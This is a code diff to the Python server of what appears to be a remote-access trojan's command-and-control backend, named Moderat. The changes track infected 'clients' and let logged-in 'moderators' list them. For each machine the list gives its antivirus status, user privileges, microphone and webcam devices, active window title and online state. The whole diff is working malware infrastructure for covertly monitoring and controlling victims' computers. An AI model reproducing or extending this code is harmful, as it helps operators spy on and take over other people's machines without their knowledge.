@@ -34,6 +34,8 @@ log.addHandler(fh)
 def id_generator(size=12, chars=string.ascii_uppercase + string.digits):
     return ''.join(random.choice(chars) for _ in range(size))
 
+clients = {}
+moderators = {}
 
 class ModeratServerProtocol(Protocol):
 
@@ -42,7 +44,8 @@ class ModeratServerProtocol(Protocol):
         self.send_message_to_client(self, 'connectSuccess', 'welcome')
 
     def connectionLost(self, reason):
-        self.factory.clients = {key: value for key, value in self.factory.clients.items() if value is not self}
+        global clients
+        clients = {key: value for key, value in clients.items() if value is not self}
 
     def dataReceived(self, data):
         # Data Received
@@ -68,11 +71,12 @@ class ModeratServerProtocol(Protocol):
             # else get key from client
             else:
                 client_id = payload
-                self.send_message_to_client(self, client_id, 'clientInitializing')
-            self.factory.clients[payload] = {
-                'id': client_id,
+
+            # Add To Online Clients Dict
+            clients[client_id] = {
                 'sock': self,
             }
+            print 'INIT CLIENT ', clients
             log.info('[*] New Client from %s' % self.transport.getHost())
 
             # Create Client DB Entry
@@ -81,18 +85,19 @@ class ModeratServerProtocol(Protocol):
 
         # Clients Status Checker
         elif mode == 'infoChecker':
-            if self.factory.clients.has_key(payload['key']):
-                self.factory.clients[payload['key']] = {
+            print 'CHECKER', clients
+            if clients.has_key(payload['key']):
+                clients[payload['key']] = {
                     'ip_address':           self.transport.getHost().host,
-                    'ostype':               payload['os_type'],
+                    'os_type':              payload['os_type'],
                     'os':                   payload['os'],
                     'protection':           payload['protection'],
                     'user':                 payload['user'],
                     'privileges':           payload['privileges'],
-                    'inputdevice':          payload['audio_device'],
-                    'webcamdevice':         payload['webcamera_device'],
-                    'activewindowtitle':    payload['window_title'],
-                    'keypassword':          payload['key'],
+                    'audio_device':         payload['audio_device'],
+                    'webcamera_device':     payload['webcamera_device'],
+                    'window_title':         payload['window_title'],
+                    'key':                  payload['key'],
                 }
             else:
                 pass
@@ -117,18 +122,50 @@ class ModeratServerProtocol(Protocol):
 
                         # Create Session For Moderator and Save
                         log.info('Create Session for Moderator (%s)' % data['session_id'])
-                        self.factory.moderators[data['session_id']] = {'username': username}
+                        moderators[data['session_id']] = {'username': username}
 
                     # if Login Not Success
                     else:
                         log.warning('Moderator (%s) Login Error' % username)
                         self.send_message_to_moderator(self, 'loginError', 'moderatorInitializing')
 
-            elif data['mode'] == 'getClients':
-                log.info('Get Clients For (%s)' % self.factory.moderators[data['session_id']]['username'])
-                if self.factory.moderators[data['session_id']] == data['session_id']:
-                    clients = self.factory.ManageClients.get_clients(self.factory.moderators[data['session_id']]['username'])
-                    print clients
+        # Check if session id is active
+        elif data['mode'] == 'getClients' and data['session_id'] in moderators:
+            clients_ids = self.factory.ManageClients.get_clients(moderators[data['session_id']]['username'])
+            shared_clients = {}
+
+            # for online clients
+            for client_id in clients_ids:
+                _id = client_id[0]
+                # Online Clients
+                if clients.has_key(_id):
+                    shared_clients[_id] = {
+                        'moderator':            self.factory.ManageClients.get_moderator(_id),
+                        'alias':                self.factory.ManageClients.get_alias(_id),
+                        'ip_address':           self.transport.getHost().host,
+                        'os_type':              clients[_id]['os_type'],
+                        'os':                   clients[_id]['os'],
+                        'protection':           clients[_id]['protection'],
+                        'user':                 clients[_id]['user'],
+                        'privileges':           clients[_id]['privileges'],
+                        'audio_device':         clients[_id]['audio_device'],
+                        'webcamera_device':     clients[_id]['webcamera_device'],
+                        'window_title':         clients[_id]['window_title'],
+                        'key':                  clients[_id]['key'],
+                        'status':               True
+                    }
+                # Offline Clients
+                else:
+                    shared_clients[client_id] = {
+                        'moderator':    self.factory.ManageClients.get_moderator(_id),
+                        'key':           _id,
+                        'alias':        self.factory.ManageClients.get_alias(_id),
+                        'ip_address':   self.factory.ManageClients.get_ip_address(_id),
+                        'last_online':  self.factory.ManageClients.get_last_online(_id),
+                        'status':       False
+                    }
+
+            self.send_message_to_moderator(self, shared_clients, 'getClients')
 
 
     def recieve_message(self, data, end='[ENDOFMESSAGE]'):
@@ -165,8 +202,7 @@ class ModeratServerFactory(ServerFactory):
     ManageSessions = SessionsManagment()
 
     def __init__(self):
-        self.clients = {}
-        self.moderators = {}
+        pass
 
 
 reactor.listenTCP(CLIENTS_PORT, ModeratServerFactory())
